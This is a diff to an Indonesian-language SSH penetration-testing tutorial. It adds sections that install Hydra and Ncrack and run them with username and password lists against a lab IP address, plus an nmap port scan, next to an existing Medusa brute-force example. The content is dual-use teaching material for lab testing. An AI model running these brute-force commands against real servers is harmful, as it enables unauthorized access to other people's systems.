@@ -62,8 +62,6 @@ Untuk menjalankan OpenSSH dilakukan cara
 sudo service ssh start
 ```
 
-![](https://drive.google.com/file/d/0B0cvfLGGqXWMci1SWTlfa1dmck0/view?usp=sharing)
-
 ## 4. Langkah Instalasi SSH Brute Force Tools (Medusa)
 
 Untuk melakukan brute force pada sebuah server dibutuhkan SSH Brute Force Tools, terdapat berbagai macam tools yang bisa digunakan diantaranya adalah Hydra, Ncrack, Medusa, dll.
@@ -97,6 +95,8 @@ sudo make && sudo make install
 Dengan kedua cara diatas maka Brute Force Tools Medusa akan terinstall pada Linux.
 
 ## 5. Langkah Uji Penetrasi dengan SSH Brute Force Tools
+
+#### 5.1 Medusa
 
 Untuk melakukan serangan secara brute force terhadap sebuah server menggunakan tools medusa diharuskan memiliki daftar username serta password untuk dicoba secara brute force sampai didapatkan username dan password yang cocok.
 
@@ -149,6 +149,40 @@ medusa -h IP HOST -u "admin" -p "admin" -M ssh
 Dengan syntax diatas maka attacker melakukan attack dengan mencoba username admin serta password admin
 
 Apabilan berhasil maka medusa akan memberikan feedback berupa username dan password yang digunakan oleh server seperti gambar dibawah ini
+
+#### 5.2 Hydra
+
+Untuk melakukan uji brute force dengan menggunakan hydra install terlebih dahulu toolsnya
+
+```
+sudo apt-get install hydra
+```
+
+Lalu dilakukan dengan daftar username serta password yang telah dibuat sebelumnya
+
+```
+hydra -L username.txt -P password.txt 192.168.137.144 ssh
+```
+
+#### 5.3 Ncrack
+
+Untuk melakukan uji brute force dengan menggunakan ncrack install terlebih dahulu toolsnya
+
+```
+sudo apt-get install ncrack
+```
+
+Lalu dilakukan dengan daftar username serta password yang telah dibuat sebelumnya
+
+```
+ncrack -p 22 --U username.txt -P password.txt 192.168.137.144
+```
+
+-p adalah port yang terbuka untuk melakukan penyerangan ssh dengan melihat terlebih dahulu port mana saja yang terbuka dengan cara
+
+```
+nmap 192.168.137.144
+```
 
 # D. Uji Penetrasi 2
 
